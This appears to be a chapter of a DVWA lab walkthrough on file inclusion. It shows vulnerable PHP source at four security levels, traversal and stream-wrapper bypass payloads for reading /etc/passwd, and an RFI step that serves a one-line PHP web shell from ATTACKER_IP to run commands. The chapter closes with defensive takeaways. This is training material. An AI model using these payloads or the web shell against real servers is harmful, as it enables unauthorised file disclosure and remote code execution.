# Chapter 04 — File Inclusion / LFI-RFI (DVWA Module: File Inclusion)

## Objective
Exploit Local File Inclusion (LFI) to read sensitive server files, and understand Remote File Inclusion (RFI) concepts.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`

---

## 🟢 LOW

### Source logic
```php
$file = $_GET[ 'page' ];
include( $file );
```
No validation whatsoever on the `page` parameter.

### Burp Suite steps
1. Capture `GET /dvwa/vulnerabilities/fi/?page=include.php`.
2. Send to Repeater, change `page` param:
   ```
   page=../../../../../../etc/passwd
   page=/etc/passwd                          (absolute path)
   page=....//....//....//etc/passwd         (filter-evasion style, unnecessary at Low)
   ```
3. **RFI test** (requires `allow_url_include=On` in php.ini, often disabled by default in modern PHP):
   ```
   page=http://ATTACKER_IP/evil.txt
   ```
   Host `evil.txt` containing `<?php system($_GET['cmd']); ?>` on a local Python server:
   ```bash
   python3 -m http.server 8000
   ```
   Then request: `page=http://ATTACKER_IP:8000/evil.txt&cmd=id`

### Why it works
`include()` treats its argument as a path/URL with no restriction — path traversal sequences (`../`) escape the intended directory, and (if enabled) remote URLs are fetched and executed as PHP.

---

## 🟡 MEDIUM

### Source logic
```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );
```
Blacklists literal `http://`, `https://`, `../`, `..\`.

### Burp Suite bypass payloads
```
page=....//....//....//....//etc/passwd
```
Because `str_replace` removes `../` **once**, non-recursively — `....//` becomes `../` after a single pass (the inner `../` is stripped, leaving the outer dots to re-form a traversal sequence).

For RFI bypass:
```
page=http://attacker/evil.txt   → won't work (need real protocol)
page=hthttp://tp://attacker/evil.txt   → after "http://" stripped once, leaves "http://"
```

### Why the bypass works
Non-recursive, single-pass string substitution is a classic filter flaw — nesting the "bad" substring around itself reconstructs it after one removal pass.

---

## 🔴 HIGH

### Source logic
```php
if( !fnmatch( "file*", $file ) && !fnmatch( "http://*", $file ) && !fnmatch( "https://*", $file ) ) {
    // only allow files starting with "file" (file1.php, file2.php, file3.php)
    include( $file );
}
```
Whitelists filenames that must literally start with `file`.

### Burp Suite exercise
Attempt traversal payloads prefixed with `file`:
```
page=file../../../../etc/passwd     (fails - still contains path traversal but must start w/ "file", combining doesn't reach a valid path)
page=file:///etc/passwd             (PHP 'file://' stream wrapper — starts with "file", worth testing)
```
`file:///etc/passwd` is a strong candidate since it literally starts with the string `file` — test this against your local build; many DVWA versions ARE vulnerable to this exact bypass at High due to the `fnmatch("file*", ...)` check matching the `file://` wrapper.

### Why it's still risky
Whitelisting by *prefix string* rather than *validated file identity/extension* leaves stream-wrapper tricks (`file://`, `php://filter`, `phar://`) as a loophole — the check verifies how the string *starts*, not what it structurally *is*.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
$file = $_GET[ 'page' ];
// Whitelist array of ONLY permitted filenames
$allowed_files = array(
    "include.php", "file1.php", "file2.php", "file3.php",
);
if( in_array( $file, $allowed_files ) ) {
    include( $file );
} else {
    echo 'ERROR: File not found!';
}
```

### Why the attack fails
This is **exact-match whitelisting** — the input must be identical to one of a fixed set of known-safe filenames. No traversal, no protocol wrapper, no partial-match trick can slip through `in_array()` strict comparison.

### Burp Suite exercise
Retry every previous payload — all rejected with "File not found!", confirming exact-match whitelisting fully closes LFI/RFI.

---

## Root Cause Analysis
File inclusion vulnerabilities occur when user input controls a filesystem/stream path passed to `include`/`require`. Blacklist-based sanitization (stripping `../`, protocol prefixes) is bypassable via encoding, nesting, or wrapper tricks. Prefix-based whitelisting (`fnmatch`) is still exploitable via stream wrappers. Only strict, exact-match whitelisting of a known-good file set is safe.

## Defensive Takeaways
- Never pass raw user input into `include()`/`require()`.
- Use an explicit allow-list mapping (e.g., `page` → array key → hardcoded filename), not string pattern matching.
- Disable `allow_url_include` and `allow_url_fopen` in `php.ini` for production.
- Run the web server process with least-privilege filesystem access (chroot/containers) as defense in depth.

---
⬅ [Back: CSRF](03-csrf.md) | ➡ [Next: File Upload](05-file-upload.md)
